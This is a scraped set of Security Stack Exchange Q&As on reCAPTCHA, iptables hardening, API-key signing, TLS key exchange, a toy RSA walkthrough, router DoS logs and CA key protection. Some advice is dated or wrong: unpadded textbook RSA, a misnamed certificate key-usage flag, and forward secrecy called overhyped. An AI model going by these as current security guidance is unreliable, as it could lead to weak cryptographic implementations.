","<p>This isn't really a great question for stackexchange as Google is keeping its algorithms secret so all we can really do is make guesses about how it works, but my understanding is that the new system will analyze your activity across all of Google's services (and possibly other sites that Google has some control over, such as websites that have Google ads).</p>

<p>Thus, it is likely that the checks are not limited to  just the page that has the checkbox on it. For example, if they detect that your computer/IP address you are using was also used in the past to do things that a normal human would do - things like checking Gmail, searching on Google search, uploading files to Drive, sharing photos, browsing the web etc. - then it can probably be reasonably sure that you are a human and allow you to skip the image verification. On the other hand, if it can't associate your computer with any previous human-like activity, then it would be more suspicious and give you the image verification. Though the mouse behavior as it clicks the checkbox may be one factor it analyzes, there is almost certainly a lot more to it.</p>

<p>Again, we don't know for sure how it works. This is just my best guess based on what little Google has said:</p>

<blockquote>
  <p>While the new reCAPTCHA API may sound simple, there is a high degree
  of sophistication behind that modest checkbox. CAPTCHAs have long
  relied on the inability of robots to solve distorted text. However,
  our research recently showed that today’s Artificial Intelligence
  technology can solve even the most difficult variant of distorted text
  at 99.8% accuracy. Thus distorted text, on its own, is no longer a
  dependable test.</p>
  
  <p>To counter this, last year we developed an Advanced Risk Analysis
  backend for reCAPTCHA that actively considers a user’s entire
  engagement with the CAPTCHA—before, during, and after—to determine
  whether that user is a human. This enables us to rely less on typing
  distorted text and, in turn, offer a better experience for users.  We
  talked about this in our Valentine’s Day post earlier this year.</p>
</blockquote>

<p>To me the point about ""before, during, and after use"" is a strong hint that they analyze previous browsing behavior, but my interpretation could be wrong.</p>

<p>Here's a quote from WIRED:</p>

<blockquote>
  <p>Instead of depending upon the traditional distorted word test,
  Google’s “reCaptcha” examines cues every user unwittingly provides: IP
  addresses and cookies provide evidence that the user is the same
  friendly human Google remembers from elsewhere on the Web. And Shet
  says even the tiny movements a user’s mouse makes as it hovers and
  approaches a checkbox can help reveal an automated bot.</p>
</blockquote>

<p>There is another thread on stackoverflow discussing this as well: <a href=""https://stackoverflow.com/questions/27286232/how-does-new-google-recaptcha-work"">https://stackoverflow.com/questions/27286232/how-does-new-google-recaptcha-work</a></p>

<p>As for image verification, you're not going to be able to find those images with reverse image search, or compile a database of them. They are usually random street signs or house numbers captured by Google's Street View cars, or words from books that were scanned for the Google Books project. There is a good purpose behind this - Google actually makes use of what people type into reCaptcha to improve their own databases and train OCR algorithms. reCaptcha gives the same image to a number of users, and if they all agree on what it says, then the picture becomes training data for Google's AI.</p>

<p>From wikipedia:</p>

<blockquote>
  <p>The reCAPTCHA service supplies subscribing websites with images of
  words that optical character recognition (OCR) software has been
  unable to read. The subscribing websites (whose purposes are generally
  unrelated to the book digitization project) present these images for
  humans to decipher as CAPTCHA words, as part of their normal
  validation procedures. They then return the results to the reCAPTCHA
  service, which sends the results to the digitization projects.</p>
  
  <p>reCAPTCHA has worked on digitizing the archives of The New York Times
  and books from Google Books.[3] As of 2012, thirty years of The New
  York Times had been digitized and the project planned to have
  completed the remaining years by the end of 2013. The now completed
  archive of The New York Times can be searched from the New York Times
  Article Archive, where more than 13 million articles in total have
  been archived, dating from 1851 to the present day.</p>
</blockquote>
","78814"
"Tips for a secure iptables config to defend from attacks. (client side!)","35005","","<p>Own examples:</p>

<pre><code>###############
# KERNEL PARAMETER CONFIGURATION

# PREVENT YOU SYSTEM FROM ANSWERING ICMP ECHO REQUESTS
echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all

# DROP ICMP ECHO-REQUEST MESSAGES SENT TO BROADCAST OR MULTICAST ADDRESSES
echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_broadcasts

# DONT ACCEPT ICMP REDIRECT MESSAGES
echo 0 &gt; /proc/sys/net/ipv4/conf/all/accept_redirects

# DONT SEND ICMP REDIRECT MESSAGES
echo 0 &gt; /proc/sys/net/ipv4/conf/all/send_redirects

# DROP SOURCE ROUTED PACKETS
echo 0 &gt; /proc/sys/net/ipv4/conf/all/accept_source_route

# ENABLE TCP SYN COOKIE PROTECTION FROM SYN FLOODS
echo 1 &gt; /proc/sys/net/ipv4/tcp_syncookies

# ENABLE SOURCE ADDRESS SPOOFING PROTECTION
echo 1 &gt; /proc/sys/net/ipv4/conf/all/rp_filter

# LOG PACKETS WITH IMPOSSIBLE ADDRESSES (DUE TO WRONG ROUTES) ON YOUR NETWORK
echo 1 &gt; /proc/sys/net/ipv4/conf/all/log_martians

# DISABLE IPV4 FORWARDING
echo 0 &gt; /proc/sys/net/ipv4/ip_forward

###############
# INPUT

# DROP INVALID
$IPTABLES -A INPUT -m state --state INVALID -j DROP

# ALLOW ONLY ESTABLISHED, RELATED
$IPTABLES -A INPUT -p tcp -i $PUBIF -m state --state ESTABLISHED,RELATED -j ACCEPT
$IPTABLES -A INPUT -p udp -i $PUBIF -m state --state ESTABLISHED,RELATED -j ACCEPT

# DROP INVALID SYN PACKETS
$IPTABLES -A INPUT -p tcp --tcp-flags ALL ACK,RST,SYN,FIN -j DROP
$IPTABLES -A INPUT -p tcp --tcp-flags SYN,FIN SYN,FIN -j DROP
$IPTABLES -A INPUT -p tcp --tcp-flags SYN,RST SYN,RST -j DROP

# MAKE SURE NEW INCOMING TCP CONNECTIONS ARE SYN PACKETS; OTHERWISE WE NEED TO DROP THEM 
$IPTABLES -A INPUT -p tcp ! --syn -m state --state NEW -j DROP

# DROP PACKETS WITH INCOMING FRAGMENTS. THIS ATTACK RESULT INTO LINUX SERVER PANIC SUCH DATA LOSS
$IPTABLES -A INPUT -f -j DROP

# DROP INCOMING MALFORMED XMAS PACKETS
$IPTABLES -A INPUT -p tcp --tcp-flags ALL ALL -j DROP

# DROP INCOMING MALFORMED NULL PACKETS
$IPTABLES -A INPUT -p tcp --tcp-flags ALL NONE -j DROP

###############
# OUTPUT

# DROP INVALID
$IPTABLES -A OUTPUT -m state --state INVALID -j DROP

# DROP INVALID SYN PACKETS
$IPTABLES -A OUTPUT -p tcp --tcp-flags ALL ACK,RST,SYN,FIN -j DROP
$IPTABLES -A OUTPUT -p tcp --tcp-flags SYN,FIN SYN,FIN -j DROP
$IPTABLES -A OUTPUT -p tcp --tcp-flags SYN,RST SYN,RST -j DROP

# MAKE SURE NEW OUTGOING TCP CONNECTIONS ARE SYN PACKETS; OTHERWISE WE NEED TO DROP THEM 
$IPTABLES -A OUTPUT -p tcp ! --syn -m state --state NEW -j DROP

# DROP PACKETS WITH OUTGOING FRAGMENTS. THIS ATTACK RESULT INTO LINUX SERVER PANIC SUCH DATA LOSS
$IPTABLES -A OUTPUT -f -j DROP

# DROP OUTGOING MALFORMED XMAS PACKETS
$IPTABLES -A OUTPUT -p tcp --tcp-flags ALL ALL -j DROP

# DROP OUTGOING MALFORMED NULL PACKETS
$IPTABLES -A OUTPUT -p tcp --tcp-flags ALL NONE -j DROP
</code></pre>

<p>Can we gather more great iptables related ideas to protect clients from attacks? E.g.: an Ubuntu 11.04 Desktop PC's ""defend from attacks"" ~kind rules.</p>

<p>Thank you!</p>

<p>p.s.: of course:</p>

<pre><code>$IPTABLES -P INPUT DROP
$IPTABLES -P FORWARD DROP
$IPTABLES -P OUTPUT DROP
</code></pre>

<p>p.s.2: both on IPv4 and IPv6!</p>

<p>p.s.3: I don't need rules like: only allow UDP and TCP on port 53 outbound, I just want ""defending"" rules from e.g.: portscanning, attacks, etc.</p>

<p>p.s.4: The PC is behind a router/NAT or connected ""directly to the internet"".</p>
","<p>I realize there are different opinions, but one major attitude of people who really know about networking and security is that most of these iptables/sysctl rules are redundant, if not damaging to you and the network. Some will aggressively criticize you for breaking with standard behavior without reason. Some examples:</p>

<ul>
<li><p>The standard TCP/IP behavior is to REJECT so that the peer gets some hint on what is going on. Maybe someone just typed a URL wrong or your admin is counting the hosts or somebody wants to connect to your gaming server but typed the wrong port. With DROP they only get obscure and annoying timeouts.</p></li>
<li><p>There is no need to drop invalid or malformed packets, all of these attacks are a decade old. The Linux kernel devs are much more up to date than you concerning which kind of packets are valid and which not. ""What about future flaws"", some might argue. Well, how do you know the future flaw will be in the TCP handler and not in the iptables TCP parser?</p></li>
<li><p>Most of the sysctl settings are default. If they are not, there is usually a reason. Eg, why disable sending redirects? I find it very useful to be informed by a peer that my routing is bad,  even if I would never react(""accept_redirects"", default=0) automatically.</p></li>
<li><p>With your log_martians and other logging rules I hope you also have a quota on /var/log, or it will be big fun to remotely fill your disk, usually killing your services/apps. In addition, you should use a rate limit for the logging or someone might fill the quota to prevent you from  seeing the SSH password bruteforce attempts in auth.log, or other stuff. Are you actually reading those logs on a desktop? I recommend logcheck.</p></li>
<li><p>You appear to block ICMP. Apart from the mentioned DHCP issue, this also prevents PMTU discovery. Without PMTUD, you will get strange behavior when you use the system in places with DSL connection or other network settings. Some packets will just be dropped and nobody tells you why.</p></li>
<li><p>Filtering outbound packets is kind of obscure. Do you not trust yourself? You should generally not run any programs you cannot trust. Commodity operating systems are mostly incapable of isolating these programs from eavesdropping or even manipulating other program's data (e.g., cache timing attacks)</p></li>
<li><p>You require NEW packets to have SYN. This will break if a TCP connection is continued after the respective state in iptables already timed out. Not sure what the default timeouts are, but some netfilter guy warned about it.</p></li>
</ul>

<p>So, when should a desktop have a firewall?</p>

<ul>
<li><p>If there is a specific attack in the news that your current OS or servers are vulnerable to, and one of the recommended quick fixes is a firewall rule.</p></li>
<li><p>You have to run certain services that do not allow secure configuration. Most do, and the rest is best replaced by secure alternatives.</p></li>
<li><p>You have more complex networks with several VMs and/or interfaces on your desktop.</p></li>
</ul>

<p>The first and foremost tool for your network security is the system update. Secondly, there is netstat and nmap, which you should use to find and confirm what services you are running. Then just disable those you don't need or confine them to 127.0.0.1.</p>

<p>Bonus if you read this far: Packets are either ESTABLISHED,RELATED or NEW, everything else you drop. You also drop NEW unless only SYN is set. Since ESTABLISHED,RELATED seems to check flags, this makes all of the --tcp-flags rules and also the -f rule redundant. Same for OUTPUT, but since no packets are ACCEPTed for OUTPUT anyhow, that probably doesn't matter.</p>
","4745"
"How to implement an API-Key-Mechanism","34998","","<p>first of all: I am quite unsure about the title of the question, so if you have a better idea, please feel free to tell (:</p>

<p>I would like to know about best-practise examples where services (like Twitter or co) which offer APIs and want you as a developer to use some API-Key prevent third parties from getting that key.</p>

<p>I will explain my regards with bad examples:</p>

<p>As far as I know, Twitter and FB require you to use API-Keys for API-requests. That's fine for server-side applications, but as soon as you submit your key from a web-app or desktop-application, the key is visible to others.</p>

<p>Because you have to submit that key, it doesn't make much sense to super-securely store it inside your app. For the request, it has to be plain.</p>

<p>One thing you might do is to host your own web-service or wrapper which appends the key server side and then routes that request to the target server.</p>

<p>But this is not possible if Twitter/or whatever service you are using is limiting API-requests per IP or want's to create IP-based statistics.</p>

<p><strong>So to sum it up: If I was in the position to create an API for others and don't want them to use SSL, what possibilities would I have to make sure their key is safe and can not easily be stolen?</strong></p>
","<p>The best practice is:</p>

<p><strong>The basic idea.</strong> Create an API key (a 128-bit symmetric key) for each separate user account.  This key needs to be securely stored on the server, and also securely stored on the user's client.</p>

<p>For each request made by the client, add an extra request parameter that has a ""signature"" on the entire request.  The ""signature"" should be calculated as S = MAC(<em>K</em>, <em>R</em>), where <em>K</em> is the API key and <em>R</em> is the entire request, including all request parameters.  Here MAC should be a secure message authentication code algorithm, such as AES-CMAC or SHA1-HMAC.</p>

<p>It is the client's responsibility to compute the signature and append it to the request; it is the server's responsibility to verify the signature and ignore any request with an invalid signature.  You may also need to include an additional parameter with the request that identifies the user account making the request.</p>

<p>This will provide authentication of the request, but not confidentiality or replay prevention, and the client does receive an authenticated response from the server.</p>

<p>I suggest sending all requests over https (not http).  This will provide an additional level of security against a number of tricky cases.  The performance implications of doing this are less than you might think -- <a href=""http://www.imperialviolet.org/2010/06/25/overclocking-ssl.html"" rel=""nofollow noreferrer"">SSL has less performance overhead than most people think</a> -- so <a href=""https://security.stackexchange.com/q/258/971"">don't discard this idea on performance grounds</a> unless you've actually <a href=""https://stackoverflow.com/q/149274/781723""><em>measured</em></a> the performance overhead and found it to be unacceptable.</p>

<p><strong>Additional things to watch out for.</strong>  You may want to use a one-time-use nonce, to prevent replay of authenticated requests.  I suggest using a cryptographic-strength random value (at least 64 bits long).  This is unnecessary if you are using https.</p>

<p>Make sure your server is written to defend against <a href=""http://blog.iseclab.org/2010/12/08/http-parameter-pollution-so-how-many-flawed-applications-exist-out-there-we-go-online-with-a-new-service/"" rel=""nofollow noreferrer"">host-parameter pollution (HPP) attacks</a>.  For instance, it should reject any request with multiple request parameters of the same type (e.g., <code>http://example.com/foo.html?name=x&amp;name=y</code>).  Also, when writing server code, be careful when creating new requests based upon a request you received.  For instance, before processing each request, your server code might validate that the request comes with only the expected list of parameters and nothing more; discard duplicate parameters or unexpected parameters before processing the request.</p>

<p>Watch out for <a href=""https://security.stackexchange.com/a/2212/971"">concatenation flaws</a> if you decide to protect multiple values with the message authentication code.</p>

<p></p>
","18687"
"What key exchange mechanism should be used in TLS?","34934","","<p>There are many key exchange mechanisms that can be used in TLS. Among them are RSA, ECDH_ECDSA, ECDHE_ECDSA, ECDH_RSA, ECDHE_RSA and others. Which of these are more cryptographically secure and can be used for securing connection with web site?</p>
","<p>You may use a key exchange (as part of a cipher suite) only if the server key type and certificate match. To see this in details, let's have a look at cipher suites defined in the <a href=""http://tools.ietf.org/html/rfc5246"">TLS 1.2 specification</a>. Each cipher suite defines the key exchange algorithm, as well as the subsequently used symmetric encryption and integrity check algorithms; we concentrate here on the key exchange part.</p>

<ul>
<li><p>RSA: the key exchange works by <em>encrypting</em> a random value (chosen by the client) with the server public key. This requires that the server public key is an RSA key, <em>and</em> that the server certificate does not prohibit encryption (mainly through the ""Key Usage"" certificate extension: if that extension is present, it must include the ""keyAgreement"" flag).</p></li>
<li><p>DH_RSA: the key exchange is a <em>static Diffie-Hellman</em>: the server public key must be a Diffie-Hellman key; moreover, that certificate must have been issued by a Certification Authority which itself was using a RSA key (the CA key is the key which was used to sign the server certificate).</p></li>
<li><p>DH_DSS: like DH_RSA, except that the CA used a DSA key.</p></li>
<li><p>DHE_RSA: the key exchange is an <em>ephemeral Diffie-Hellman</em>: the server dynamically generates a DH public key and sends it to the client; the server also <em>signs</em> what it sends. For DHE_RSA, the server public key must be of type RSA, and its certificate must be appropriate for <em>signatures</em> (the Key Usage extension, if present, must include the digitalSignature flag).</p></li>
<li><p>DHE_DSS: like DHE_RSA, except that the server key has type DSA.</p></li>
<li><p>DH_anon: there is no server certificate. The server uses a Diffie-Hellman key that it may have dynamically generated. The ""anon"" cipher suites are vulnerable to impersonating attacks (including, but not limited to, the <a href=""http://en.wikipedia.org/wiki/Man-in-the-middle_attack"">""Man in the Middle""</a>) since they lack any kind of server authentication. On a general basis, you shall not use an ""anon"" cipher suite.</p></li>
</ul>

<p>Key exchange algorithms which use elliptic-curve cryptography are specified in <a href=""http://tools.ietf.org/html/rfc4492"">another RFC</a> and propose the following:</p>

<ul>
<li><p>ECDH_ECDSA: like DH_DSA, but with elliptic curves: the server public key must be an ECDH key, in a certificate issued by a CA which itself was using an ECDSA public key.</p></li>
<li><p>ECDH_RSA: like ECDH_ECDSA, but the issuing CA has a RSA key.</p></li>
<li><p>ECDHE_ECDSA: the server sends a dynamically generated EC Diffie-Hellman key, and signs it with its own key, which must have type ECDSA. This is equivalent to DHE_DSS, but with elliptic curves for both the Diffie-Hellman part and the signature part.</p></li>
<li><p>ECDHE_RSA: like ECDHE_ECDSA, but the server public key is a RSA key, used for signing the ephemeral elliptic-curve Diffie-Hellman key.</p></li>
<li><p>ECDH_anon: an ""anon"" cipher suite, with dynamic elliptic-curve Diffie-Hellman.</p></li>
</ul>

<hr />

<p>So, what shall you choose, for a Web site ? Your main constraints are:</p>

<ul>
<li><p>You want a cipher suite which is supported by most clients; in practice, this rules out elliptic curve cryptography (elliptic curves are mightily cool, but not well supported yet in the field -- consider that according to <a href=""http://gs.statcounter.com/"">gs.statcounter</a>, as of September 2011, 40% of client systems still use Windows XP, and almost 5% use IE 7.0).</p></li>
<li><p>You want a cipher suite which is compatible with your server key type and certificate. This, in turn, depends on what the CA accepts (the CA which sold you the certificate). 99.9% of the time, this means RSA. Everybody does RSA. Diffie-Hellman keys in certificates, and DSA signatures, used to be promoted by NIST (the US federal agency which deals with such matters) because there was a patent on RSA; but that patent expired in 2000. Diffie-Hellman (as part of certificates) is specified by <a href=""http://webstore.ansi.org/RecordDetail.aspx?sku=ANSI%20X9.42:2003"">ANSI X9.42</a>, a standard which is not free (so opensource free-time developers are reluctant to implement it) and not all that clear either. So nobody really uses Diffie-Hellman in certificates. DSA is more widely supported (its <a href=""http://csrc.nist.gov/publications/fips/fips186-3/fips_186-3.pdf"">defining standard</a> is free and quite readable) but not to the point of being non-anecdotic when compared to RSA.</p></li>
<li><p>You do not want to use an ""anon"" suite because that's insecure against active attackers, and most client browsers have the ""anon"" suites deactivated by default.</p></li>
</ul>

<p>So you choice is basically between ""RSA"" and ""DHE_RSA"". The latter may have a slightly higher computational cost, although you would need to have at least a few hundred new connections per second to actually see a difference (I insist on the ""new"": since TLS includes an abbreviated handshake which can build on the key exchange of a previous connection, the actual key exchange with asymmetric cryptography only occurs once per new client browser in the last minute). So, in practice, no measurable difference on the CPU load between RSA and DHE_RSA.</p>

<p>DHE_RSA offers something known as <a href=""http://en.wikipedia.org/wiki/Perfect_forward_secrecy"">Perfect Forward Secrecy</a>, a pompous name for the following property: if your server gets thoroughly hacked, to the point that the attacker obtains a copy of the server private key, then he will also be able to decrypt <em>past</em> TLS sessions (which he recorded) if these sessions used RSA, while he will not be able to do so if these sessions used DHE_RSA. In practice, if the attacker could steal your private key, then he probably could read the 10000 credit card numbers in your site database, so there is little reason why he should even bother recording and decrypting previous sessions because this would yield only a dozen extra numbers or so. PFS is mathematically elegant, but overhyped. If it still a nifty acronym and can make a great impression on the weakly-minded, as part of a well-thought public relations campaign.</p>

<hr />

<p><strong>Summary:</strong> use DHE_RSA.</p>
","8348"
"Using Python for security","34927","","<p>I love using Python for the scripts I need and for work. But I really want to learn Python for network security since I will start a NS course next year.</p>

<p>My question would be how would it be the best way to learn? I was thinking of starting by writing a network sniffer or a like, but I think this is a bit to high to start learning (correct me if I am wrong), what would be the basic tool to code for the learning?</p>
","<p>Not to repeat the Scapy recommendation but on a slightly different aspect, as you're a beginner, check out Adam Maxwell's new basic <a href=""http://theitgeekchronicles.files.wordpress.com/2012/05/scapyguide1.pdf"">intro guide</a> to Scapy, it's a very good introduction. </p>

<p>I would also recommend checking this <a href=""http://securitytube-training.com/certifications/securitytube-python-scripting-expert/"">course</a> out - it's only $200 and well worth it. The course is both an excellent introduction to Python and also how to use Python in security, with some great challenges where you can put your new skillz into practice.</p>

<p>Finally, I'd follow <a href=""http://twitter.com/#!/markbaggett"">Mark Baggett on Twitter</a> and have a look at some of his work, such as <a href=""http://pauldotcom.com/2010/09/web-application-penetration-te.html"">this</a>. Most of his stuff is on his site <a href=""http://www.indepthdefense.com/2012/05/stuff-i-worked-on-in-2011-2012.html"">here</a>. His python scripts are from both an offensive and defensive aspect so go check those links out.</p>
","16080"
"Is there a simple example of an Asymmetric encryption/decryption routine?","34834","","<p>I can understand Java, Perl and JavaScript code very well. The rest, I have not studied, but I guess I could figure out how to read/translate.</p>

<p>I would like to know what the simplest of Asymmetric routines are. Is it really too complex to want to worry about?</p>

<p>I am just really curious how it is possible to have an encryption-only key! It just seems amazing to me that it could resist reverse-engineering so I want to know how it works!</p>

<ol>
<li>Is it too complicated for that.</li>
<li>What is (one of) the simplest standard Asymmetric encryption routine(s) that I can look up an implementation for?</li>
<li>If you happen have any minimal code examples that would be nice.</li>
</ol>

<p>I already checked the <a href=""http://en.wikipedia.org/wiki/Public-key_cryptography#How_it_works"">Wikipedia paragraphs on How It Works</a>, but there was no mathematical breakdown or description of implementation, just <a href=""http://en.wikipedia.org/wiki/Public-key_cryptography#Examples"">lots of implementations</a>. I did not really want to randomly pick which one to look at, neither did I want to take the most common one which I expect is most robust and most complicated.</p>

<p>Any thoughts?</p>
","<p>Credit goes to <a href=""https://security.stackexchange.com/questions/7483/is-there-a-simple-example-of-an-asymmetric-encryption-decryption-routine/7487#7487"">Jeff's answer</a> for the details and <a href=""https://security.stackexchange.com/questions/7483/is-there-a-simple-example-of-an-asymmetric-encryption-decryption-routine/7484#7484"">Steve's answer</a> which was also helpful. Credit also goes to <a href=""https://security.stackexchange.com/questions/7483/is-there-a-simple-example-of-an-asymmetric-encryption-decryption-routine/7503#7503"">tylerl's answer</a> which included links to Wikipedia for all the functions, particularly <a href=""http://en.wikipedia.org/wiki/Modular_multiplicative_inverse"" rel=""nofollow noreferrer""><code>modInverse</code></a>, also it clarified the ambiguous starting point for <code>e</code>. <strong>Thank you,</strong> I upvoted your answers, and using combined information from all three answers, I created what I hope is a better answer.</p>

<p><strong>The key to making</strong> reverse-engineering so expensive is using <strong>power-of</strong>. Square root is not so hard, power of 3 means you need a cubed root, but power of 34,051,489 is pretty hard. There are other mathematical operations that are difficult to reverse-engineer. There are also multiple ways to create an Asymmetric Algorithm, but this answer focuses on RSA. The oldest and most common.</p>

<p><strong>RSA Algorithm</strong> (based on <a href=""http://pajhome.org.uk/crypt/rsa/implementation.html"" rel=""nofollow noreferrer"">the Java Code</a>)</p>

<p>The the below calculations should be done with <a href=""http://en.wikipedia.org/wiki/Arbitrary-precision_arithmetic"" rel=""nofollow noreferrer"">arbitrary precision integers</a>. (Such as BigInt or BigInteger)</p>

<p><strong>Generating the keys:</strong>  </p>

<ul>
<li>Constant key length is <code>l</code>. </li>
<li>Usually constant <code>e_start</code> can <code>=3</code> for simplicity. However, <code>0x10001</code> is more common, at any rate, a prime number is best (for key-generation performance reasons and probably other reasons).</li>
<li><code>p</code> and <code>q</code> are the randomly generated positive prime numbers, that require up to <code>l</code> bits for storage. (To keep these positive, the first bit will always be <code>0</code>)</li>
<li><code>n</code> = <code>p*q</code> This is used for both the encryption and decryption.  </li>
<li><code>e</code> starts off as <code>e_start</code>. This will eventually be the part of the encryption key.</li>
<li><code>m</code> = <code>(p-1)*(q-1)</code> is used to convert <code>e</code> to <code>d</code>, which will be used for decryption.</li>
<li><code>while(</code><a href=""http://en.wikipedia.org/wiki/Greatest_common_divisor"" rel=""nofollow noreferrer""><code>gcd</code></a><code>(e,m)&gt;1){e+=2}</code> This is necessary for the next step to work.  </li>
<li><code>d=</code><a href=""http://en.wikipedia.org/wiki/Modular_multiplicative_inverse"" rel=""nofollow noreferrer""><code>modInverse</code></a><code>(e,m)</code> This performs a standard arithmatic operation. Probably not worth examining much, especially if your programming language has this built in</li>
</ul>

<p>To encrypt or decrypt, first convert your bytes to a single arbitrary precision integer.</p>

<p><strong>Encryption:</strong> <code>encrypted=(plain^e)%n</code></p>

<p>Note: If <code>plain&gt;=n</code>, you must split <code>plain</code> into two or more smaller values and encrypt them separately.</p>

<p><strong>Decryption:</strong> <code>plain=(encrypted^d)%n</code></p>

<p>Asymmetric encryption is typically less efficient than Symmetric encryption. Sometimes Asymmetric encryption is used only for key exchange.</p>
","7510"
"Is it safe to ignore DoS attacks on my router?","34831","","<p>There are several entries in my router's log file showing recent DoS attempts on some of its ports. They look like this:</p>

<pre><code>[DoS Attack: ACK Scan] from source: 213.61.245.234, port 80, Friday, November 21,2014 11:37:59
[DoS Attack: ACK Scan] from source: 80.239.159.8, port 443, Friday, November 21,2014 11:18:09
...
[DoS Attack: RST Scan] from source: 195.39.197.142, port 30732, Wednesday, November 19,2014 22:12:35
[DoS Attack: ACK Scan] from source: 31.13.91.117, port 443, Wednesday, November 19,2014 17:56:38
[DoS Attack: ACK Scan] from source: 88.221.82.74, port 443, Wednesday, November 19,2014 17:56:33
[DoS Attack: ACK Scan] from source: 31.13.91.117, port 443, Wednesday, November 19,2014 17:56:06
[DoS Attack: ACK Scan] from source: 88.221.82.74, port 443, Wednesday, November 19,2014 17:56:01
[DoS Attack: ACK Scan] from source: 31.13.91.117, port 443, Wednesday, November 19,2014 17:55:50
[DoS Attack: ACK Scan] from source: 88.221.82.74, port 443, Wednesday, November 19,2014 17:55:44
[DoS Attack: ACK Scan] from source: 31.13.91.117, port 443, Wednesday, November 19,2014 17:55:38
[DoS Attack: ACK Scan] from source: 88.221.82.74, port 443, Wednesday, November 19,2014 17:55:36
[DoS Attack: ACK Scan] from source: 31.13.91.117, port 443, Wednesday, November 19,2014 17:55:36
[DoS Attack: ACK Scan] from source: 88.221.82.74, port 443, Wednesday, November 19,2014 17:55:30
[DoS Attack: RST Scan] from source: 128.199.49.106, port 18668, Wednesday, November 19,2014 15:06:46
</code></pre>

<p>Tried scanning my router's public IP for open ports:</p>

<pre><code>sudo nmap &lt;my-public-ip&gt; -Pn --reason --top-ports 10

Starting Nmap 6.47 ( http://nmap.org ) at 2014-11-21 16:02 CET
Nmap scan report for &lt;public-hostname&gt; (&lt;my-public-ip&gt;)
Host is up, received user-set.
PORT     STATE    SERVICE       REASON
21/tcp   filtered ftp           no-response
22/tcp   filtered ssh           no-response
23/tcp   filtered telnet        no-response
25/tcp   filtered smtp          no-response
80/tcp   filtered http          no-response
110/tcp  filtered pop3          no-response
139/tcp  filtered netbios-ssn   no-response
443/tcp  filtered https         no-response
445/tcp  filtered microsoft-ds  no-response
3389/tcp filtered ms-wbt-server no-response
</code></pre>

<p>I'm curious, how does my router know that each one is a DoS attack in the first place? Are these cases of using <code>nmap</code> aggressively in some way? And should I be worried about these attacks?</p>
","<p>Looking up these IP addresses in Google give the following results:</p>

<ul>
<li>31.13.91.117 => <a href=""https://www.virustotal.com/en/ip-address/31.13.91.117/information/"">related to Facebook</a></li>
<li>88.221.82.74 => <a href=""https://db-ip.com/88.221.82.74"">related to Akamai</a></li>
</ul>

<p>Given the fact that Akamai is a content provider (CDN) which has <a href=""http://en.wikipedia.org/wiki/Akamai_Technologies"">reportedly</a> been having Facebook as a customer, it seems that this might not be a real DOS attack, and that your router's protection is exaggerating. Is it possible that a lot of your employees/family members use Facebook, which causes a lot of (legitmate) Facebook responses to come in on your router? The router might see this as a DOS-attack, when it is in fact not. This is supported by the fact that the 'scans' come from <strong>source</strong> port 443, which is the TLS (HTTPS) port. You are connected via HTTPS to Facebook, and they reply to you.</p>

<p>The other IP addresses listed in your question seem a little bit more shifty, but again, this might be a legitimate site which is sending a lot of responses (lots of CSS, JS, etc.). However, the ones that list port 30372 and 18668 are very shifty. These may be part of a massive scan or just a coincidence. I wouldn't worry about them if they don't appear regularly.</p>
","73356"
"How do certification authorities store their private root keys?","34784","","<p>Knowledge of a CA private key would allow MitM attackers to transparently supplant any certificates signed by that private key. It would also allow cyber criminals to start forging their own trusted certificates and selling them on the black market.</p>

<p>Given the huge profits that could be made with such knowledge, and the fact that a highly trusted and ubiquitous certificate (such as any of the main Verisign keys) would be a very difficult thing to revoke quickly, it stands to reason that there would be highly motivated and well funded criminal elements attempting to get their hands on such keys on a regular basis.</p>

<p>How do certification authorities deal with this threat? It sounds like a real nightmare, having to ring-fence the keys away from all human eyes, even the sysadmins. All the while the keys have to be used on a daily basis, often by internet-connected signing services.</p>
","<p><strong>Serious</strong> certification authorities use heavy procedures. At the core, the CA key will be stored in a <a href=""http://en.wikipedia.org/wiki/Hardware_security_module"">Hardware Security Module</a>; but that's only part of the thing. The CA itself must be physically protected, which includes <em>proactive</em> and <em>retrospective</em> measures.</p>

<p><strong>Proactive measures</strong> are about preventing attacks from succeeding. For instance, the CA will be stored in a vault, with steel doors and guards. The machines themselves are locked, with <em>several</em> padlocks, and nobody holds more than one padlock key. Physical security is of paramount importance; the HSM is only the deepest layer.</p>

<p><strong>Retrospective measures</strong> are about recovering after an incident. The HSM will <em>log</em> all signatures. The machine is under 24/7 video surveillance, with off-site recording. These measures are about knowing what has happened (if you prefer, knowing <em>a priori</em> that, should a problem occur, we will be able to analyze it <em>a posteriori</em>). For instance, if ""illegal"" certificates have been emitted but the complete list of such certificates can be rebuilt, then recovery is as ""easy"" as revoking the offending certificates.</p>

<p>For extra recovery, the CA is often split into a long-lived root CA which is kept offline, and a short-lived intermediate CA. Both machines are in the cage and bunker; the root CA is never connected to a network. The root CA is physically accessed, with dual control (at least two people together, and video recording) on a regular basis, to emit the certificate for the intermediate CA, and the CRL. This allows <em>revoking</em> an intermediate CA if it got thoroughly hacked (to the point that its private key was stolen, or the list of fraudulently emitted certificates cannot be rebuilt).</p>

<hr />

<p><strong>Initial setup</strong> of a serious root CA involves a <a href=""http://en.wikipedia.org/wiki/Key_Ceremony"">Key Ceremony</a> with herds of auditors with prying eyes, and a formalism which would not have been scorned by a Chinese Emperor from the Song dynasty. No amount of auditing can guarantee the absence of vulnerabilities; however, that kind of ceremony can be used to <em>know</em> what was done, to show that <em>security issues have been thought about</em>, and, come what may, to identify the culprit if trouble arises. I have been involved in several such ceremonies; they really are a big ""security theater"" but have merits beyond the mere display of activities: they force people to have written procedures for <em>everything</em>.</p>

<hr />

<p>The question is now: are <em>existing</em> CA really serious, in the way described above ? In my experience, they mostly are. If the CA has anything to do with VISA or MasterCard, then you can be sure that HSM, steel and ill-tempered pitbulls are part of the installation; VISA and MasterCard are about money and take it very seriously.</p>

<p>For the CA which are included in Web browsers and operating systems, the browser or OS vendor tends to require a lot of insurance. There again, this is about money; but the insurance company will then require all the physical measures and accounting and auditing. Formally, this will use certifications like <a href=""http://www.webtrust.org/homepage-documents/item27839.aspx"">WebTrust</a>.</p>

<p>This is true even for infamous CA like DigiNotar or Comodo: note that while they got hacked and fake certificates were issued, the said certificates are known and were revoked (and Microsoft added them to a list of ""forbidden certificates"" which can be seen as a kind of ""revoked, and we really mean it"" -- software must go out of his way to accept them nonetheless).</p>

